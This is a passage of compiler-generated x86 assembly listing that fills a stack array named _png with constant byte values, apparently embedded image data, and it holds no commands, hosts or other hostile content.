	mov	BYTE PTR _png$[ebp+935], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+936], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+937], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+938], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+939], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+940], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+941], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+942], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+943], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+944], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+945], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+946], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+947], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+948], -32		; ffffffe0H
	mov	BYTE PTR _png$[ebp+949], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+950], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+951], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+952], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+953], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+954], -37		; ffffffdbH
	mov	BYTE PTR _png$[ebp+955], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+956], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+957], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+958], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+959], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+960], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+961], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+962], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+963], -59		; ffffffc5H
	mov	BYTE PTR _png$[ebp+964], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+965], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+966], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+967], 33		; 00000021H
	mov	BYTE PTR _png$[ebp+968], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+969], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+970], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+971], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+972], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+973], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+974], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+975], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+976], 1
	mov	BYTE PTR _png$[ebp+977], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+978], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+979], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+980], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+981], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+982], -62		; ffffffc2H
	mov	BYTE PTR _png$[ebp+983], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+984], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+985], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+986], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+987], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+988], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+989], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+990], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+991], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+992], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+993], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+994], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+995], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+996], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+997], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+998], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+999], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+1000], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1001], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+1002], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1003], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+1004], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+1005], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1006], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1007], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1008], -53		; ffffffcbH
	mov	BYTE PTR _png$[ebp+1009], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1010], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1011], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+1012], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+1013], -5		; fffffffbH
	mov	BYTE PTR _png$[ebp+1014], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1015], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1016], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+1017], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+1018], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+1019], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+1020], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1021], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+1022], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1023], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+1024], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1025], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+1026], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1027], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+1028], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+1029], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+1030], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+1031], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1032], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+1033], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1034], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1035], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+1036], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1037], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1038], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1039], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1040], 1
	mov	BYTE PTR _png$[ebp+1041], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+1042], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+1043], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+1044], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+1045], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+1046], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1047], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+1048], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1049], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1050], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+1051], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+1052], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1053], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1054], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+1055], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1056], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+1057], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+1058], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+1059], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+1060], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+1061], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+1062], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1063], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1064], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1065], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+1066], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+1067], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1068], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1069], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+1070], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+1071], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+1072], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+1073], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+1074], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+1075], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1076], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1077], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+1078], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+1079], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+1080], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+1081], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+1082], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+1083], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+1084], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1085], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1086], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1087], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1088], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+1089], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+1090], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+1091], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1092], 63		; 0000003fH
	mov	BYTE PTR _png$[ebp+1093], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1094], 8
	mov	BYTE PTR _png$[ebp+1095], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+1096], 8
	mov	BYTE PTR _png$[ebp+1097], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1098], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+1099], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+1100], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+1101], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1102], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+1103], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+1104], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1105], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1106], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1107], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+1108], 126		; 0000007eH
	mov	BYTE PTR _png$[ebp+1109], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+1110], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1111], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+1112], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1113], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+1114], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1115], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+1116], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+1117], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+1118], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+1119], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+1120], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+1121], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1122], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1123], -106		; ffffff96H
	mov	BYTE PTR _png$[ebp+1124], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1125], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+1126], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+1127], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+1128], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+1129], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1130], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1131], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+1132], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+1133], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+1134], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1135], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1136], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1137], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1138], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1139], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+1140], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+1141], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+1142], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+1143], 5
	mov	BYTE PTR _png$[ebp+1144], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1145], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+1146], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+1147], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+1148], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1149], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1150], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+1151], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1152], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+1153], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1154], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+1155], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+1156], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1157], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+1158], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1159], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+1160], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1161], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1162], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+1163], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+1164], -53		; ffffffcbH
	mov	BYTE PTR _png$[ebp+1165], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+1166], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1167], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+1168], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1169], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+1170], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+1171], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1172], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+1173], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1174], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+1175], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+1176], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+1177], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+1178], -26		; ffffffe6H
	mov	BYTE PTR _png$[ebp+1179], -11		; fffffff5H
	mov	BYTE PTR _png$[ebp+1180], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1181], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1182], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+1183], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+1184], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+1185], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+1186], 119		; 00000077H
	mov	BYTE PTR _png$[ebp+1187], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+1188], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1189], -62		; ffffffc2H
	mov	BYTE PTR _png$[ebp+1190], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1191], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1192], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+1193], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+1194], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+1195], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1196], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1197], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+1198], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+1199], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+1200], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1201], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+1202], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1203], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1204], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+1205], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1206], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1207], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1208], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+1209], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1210], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+1211], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1212], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1213], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+1214], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+1215], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1216], 126		; 0000007eH
	mov	BYTE PTR _png$[ebp+1217], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+1218], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1219], 7
	mov	BYTE PTR _png$[ebp+1220], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+1221], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+1222], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1223], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1224], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+1225], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1226], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+1227], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+1228], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1229], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+1230], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+1231], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1232], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1233], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1234], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+1235], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+1236], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+1237], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+1238], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1239], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1240], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1241], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1242], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+1243], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1244], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1245], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+1246], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1247], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+1248], -68		; ffffffbcH
	mov	BYTE PTR _png$[ebp+1249], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1250], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+1251], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+1252], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1253], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+1254], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+1255], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+1256], -53		; ffffffcbH
	mov	BYTE PTR _png$[ebp+1257], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1258], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1259], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+1260], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+1261], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1262], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+1263], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+1264], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+1265], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+1266], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+1267], 2
	mov	BYTE PTR _png$[ebp+1268], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1269], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+1270], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+1271], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1272], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+1273], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+1274], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+1275], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+1276], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1277], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+1278], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1279], 7
	mov	BYTE PTR _png$[ebp+1280], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+1281], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+1282], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+1283], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+1284], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1285], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+1286], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+1287], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+1288], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1289], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1290], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+1291], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+1292], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1293], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1294], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+1295], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+1296], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1297], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1298], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+1299], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1300], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1301], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+1302], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+1303], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1304], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+1305], 2
	mov	BYTE PTR _png$[ebp+1306], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+1307], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1308], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+1309], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+1310], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1311], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+1312], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1313], 126		; 0000007eH
	mov	BYTE PTR _png$[ebp+1314], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+1315], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1316], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+1317], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+1318], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+1319], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+1320], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+1321], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+1322], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1323], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1324], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+1325], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+1326], 92		; 0000005cH
	mov	BYTE PTR _png$[ebp+1327], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1328], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+1329], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1330], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1331], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1332], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1333], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+1334], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+1335], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1336], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+1337], 105		; 00000069H
	mov	BYTE PTR _png$[ebp+1338], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1339], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+1340], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+1341], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1342], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1343], -124		; ffffff84H
	mov	BYTE PTR _png$[ebp+1344], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+1345], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1346], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+1347], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+1348], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+1349], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+1350], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+1351], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1352], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1353], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+1354], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+1355], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+1356], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+1357], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+1358], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+1359], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+1360], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+1361], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+1362], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1363], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1364], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+1365], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1366], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+1367], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+1368], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+1369], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+1370], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1371], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1372], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+1373], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1374], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1375], -60		; ffffffc4H
	mov	BYTE PTR _png$[ebp+1376], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1377], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1378], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+1379], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1380], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+1381], 2
	mov	BYTE PTR _png$[ebp+1382], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1383], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+1384], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1385], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+1386], -122		; ffffff86H
	mov	BYTE PTR _png$[ebp+1387], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1388], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1389], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1390], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1391], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+1392], -68		; ffffffbcH
	mov	BYTE PTR _png$[ebp+1393], 9
